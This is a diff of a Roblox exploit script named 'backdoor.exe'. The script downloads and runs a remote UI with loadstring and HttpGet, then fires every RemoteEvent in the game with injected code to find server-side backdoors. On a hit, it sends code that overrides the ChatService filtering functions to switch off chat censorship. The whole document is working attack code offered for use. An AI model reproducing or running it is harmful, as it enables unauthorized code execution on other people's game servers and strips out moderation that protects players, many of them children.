@@ -17,13 +17,14 @@
 ]]
 
 
-local localPlayer = game.Players.LocalPlayer
-local UI_PARENT = game.CoreGui.RobloxGui
-local SALT = "12623546126"
+local localPlayer = game:GetService("Players").LocalPlayer
+local randID = tostring(localPlayer.UserId * 2)..tostring(math.random(100000000,1000000000))
+
+local UI_PARENT = game:GetService("CoreGui").RobloxGui
 local INV_CODE = "6HndYgC"
 
 local function notify(text,cb,b1,b2)
-	game.StarterGui:SetCore(
+	game:GetService("StarterGui"):SetCore(
 		"SendNotification",{
 			Title = "backdoor.exe",
 			Duration = 3,
@@ -37,20 +38,20 @@ end
 
 -- Removing dubs
 for _, ui in pairs(UI_PARENT:GetChildren()) do
-	if ui:IsA("ScreenGui") and string.match(ui.Name, SALT) then
+	if ui:IsA("ScreenGui") and string.match(ui.Name, tostring(localPlayer.UserId * 2)) then
 		ui:Destroy()
 	end
 end
 
 local UI = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/ui.lua"))()
 if syn then syn.protect_gui(UI) end
+
+UI.Name = randID
 UI.Parent = UI_PARENT
-UI.Name = SALT..tostring(math.random(100000000,1000000000))
 
-
-local function findObject(name, type)
+local function findObject(name)
 	 for i, object in pairs(UI:GetDescendants()) do
-		if object.Name == name and object.ClassName == type then return object end
+		if object.Name == name then return object end
 	 end
 end
 
@@ -58,25 +59,25 @@ UI.Main.Active = true
 UI.Main.Draggable = true
 
 -- Top Bar
-local closeButton = findObject("Close_Button","ImageButton")
-local statusText = findObject("Status","TextLabel")
-local statusColor = findObject("Status_Color","Frame")
-local r6Button = findObject("R6Button","ImageButton")
+local closeButton = findObject("Close_Button")
+local statusText = findObject("Status")
+local statusColor = findObject("Status_Color")
+local r6Button = findObject("R6Button")
 
 -- Source Frame
-local sourceFrame = findObject("sourceFrame","ScrollingFrame")
-local source = findObject("source","TextBox")
-local lines = findObject("lines","TextLabel")
+local sourceFrame = findObject("sourceFrame")
+local source = findObject("source")
+local lines = findObject("lines")
 
 -- Source Buttons
-local sourceButtons = findObject("Main_Buttons","Frame")
+local sourceButtons = findObject("Main_Buttons")
 --- Left
-local executeButton = findObject("Execute_Button","TextButton")
-local clearButton = findObject("Clear_Button","TextButton")
-local hideButton = findObject("Hide_Button","TextButton")
+local executeButton = findObject("Execute_Button")
+local clearButton = findObject("Clear_Button")
+local hideButton = findObject("Hide_Button")
 --- Right
-local scanButton = findObject("Scan_Button","TextButton")
-local inviteButton = findObject("Invite_Button","TextButton")
+local scanButton = findObject("Scan_Button")
+local inviteButton = findObject("Invite_Button")
 
 
 local BackdoorUI = {
@@ -114,16 +115,16 @@ local function stringToInstance(str)
 	end
 	return current
 end
-local function check(vn)
+local function check()
 	
-	if workspace:FindFirstChild(vn) then
-		BackdoorUI.backdoorRemote = stringToInstance(workspace:FindFirstChild(vn).Value)
+	if workspace:FindFirstChild(randID) then
+		BackdoorUI.backdoorRemote = stringToInstance(workspace:FindFirstChild(randID).Value)
 		
 		-- Anti-Censoring
 		BackdoorUI.backdoorRemote:FireServer("local chatservice = require(game.ServerScriptService.ChatServiceRunner.ChatService);chatservice.InternalApplyRobloxFilterNewAPI=function(self,sp,mes,textfilcon) return true,false,mes end;chatservice.InternalApplyRobloxFilter=function(self,sp,mes,toname) return mes end")
 		notify("Anti-Censoring is ACTIVE")
 		
-		workspace:FindFirstChild(vn):Destroy()
+		workspace:FindFirstChild(randID):Destroy()
 		return true
 	end
 end
@@ -148,18 +149,18 @@ local function scan()
 
 	BackdoorUI.scanning = true
 	statusText.Text = "Scanning"
-	local valueName = SALT..math.random(100000, 999999)
 
 	for _, testRemote in pairs(game:GetDescendants()) do
 		if testRemote.ClassName == "RemoteEvent" and BackdoorUI.attached == false then
-			local testScript = "i=Instance.new('StringValue',workspace) i.Name='"..
-								valueName.."' i.Value='"..testRemote:GetFullName().."'"
 
 			if remoteCheck(testRemote) then
-				testRemote:FireServer(testScript)
+				testRemote:FireServer(
+					"i=Instance.new('StringValue',workspace) i.Name='"..
+					randID.."' i.Value='"..testRemote:GetFullName().."'"
+				)
 			end
 
-			if check(valueName) then
+			if check() then
 				changeUiState()
 				return
 			end
@@ -170,7 +171,7 @@ local function scan()
 	 -- Wait for possible server lag
 	statusText.Text = "Rechecking"
 	wait(1.5)
-	if check(valueName) then
+	if check() then
 		changeUiState()
 		return
 	end
